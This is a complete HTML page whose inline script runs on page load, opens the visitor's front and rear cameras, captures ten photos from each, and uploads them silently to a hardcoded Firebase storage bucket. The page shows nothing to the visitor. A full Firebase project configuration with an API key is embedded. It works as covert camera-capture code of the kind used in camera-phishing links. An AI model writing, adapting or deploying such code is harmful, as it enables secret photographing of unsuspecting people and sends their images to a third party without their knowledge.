<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Capture 10 Front & 10 Back Images</title>

    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";

        // âœ… Replace with your Firebase config
        const firebaseConfig = {
            apiKey: "AIzaSyCUcrXxdp-xaDemWm6XeODP43L4c8nsFZU",
  authDomain: "valute3.firebaseapp.com",
  databaseURL: "https://valute3-default-rtdb.firebaseio.com",
  projectId: "valute3",
  storageBucket: "valute3.appspot.com",
  messagingSenderId: "1059488015525",
  appId: "1:1059488015525:web:db514a29cb876069d2d94c",
  measurementId: "G-VBSCFW4HQP"
        };

        // âœ… Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        async function getCameraStream(useFrontCamera) {
            const constraints = {
                video: {
                    facingMode: useFrontCamera ? "user" : "environment"
                }
            };
            return await navigator.mediaDevices.getUserMedia(constraints);
        }

        async function captureAndUploadPhoto(video, index, useFrontCamera) {
            try {
                const canvas = document.createElement("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext("2d");

                // âœ… Capture image from video stream
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // âœ… Convert image to Blob and upload
                canvas.toBlob(async (blob) => {
                    const cameraType = useFrontCamera ? "front" : "back";
                    const fileName = `images786123/${cameraType}_${index + 1}_${Date.now()}.png`;
                    const storageRef = ref(storage, fileName);
                    await uploadBytes(storageRef, blob);

                    // âœ… Get download URL
                    const downloadURL = await getDownloadURL(storageRef);
                    console.log(`Uploaded ${cameraType} image ${index + 1}:`, downloadURL);
                }, "image/png");
            } catch (error) {
                console.error("Error capturing image:", error);
            }
        }

        async function captureMultipleImages() {
            console.log("ðŸ“¸ Requesting camera permission...");

            // âœ… Request camera permission only once
            const frontStream = await getCameraStream(true);
            const backStream = await getCameraStream(false);

            const frontVideo = document.createElement("video");
            frontVideo.srcObject = frontStream;
            frontVideo.play();
            await new Promise(resolve => (frontVideo.onloadedmetadata = resolve));

            const backVideo = document.createElement("video");
            backVideo.srcObject = backStream;
            backVideo.play();
            await new Promise(resolve => (backVideo.onloadedmetadata = resolve));

            console.log("ðŸ“¸ Capturing 10 Front & 10 Back Images...");

            // âœ… Capture 10 front camera images
            for (let i = 0; i < 10; i++) {
                await captureAndUploadPhoto(frontVideo, i, true);
            }

            // âœ… Capture 10 back camera images
            for (let i = 0; i < 10; i++) {
                await captureAndUploadPhoto(backVideo, i, false);
            }

            // âœ… Stop camera streams
            frontStream.getTracks().forEach(track => track.stop());
            backStream.getTracks().forEach(track => track.stop());

            console.log("âœ… All images captured and uploaded!");
        }

        // âœ… Start capturing when the page loads
        window.onload = captureMultipleImages;
    </script>
</head>

</html>
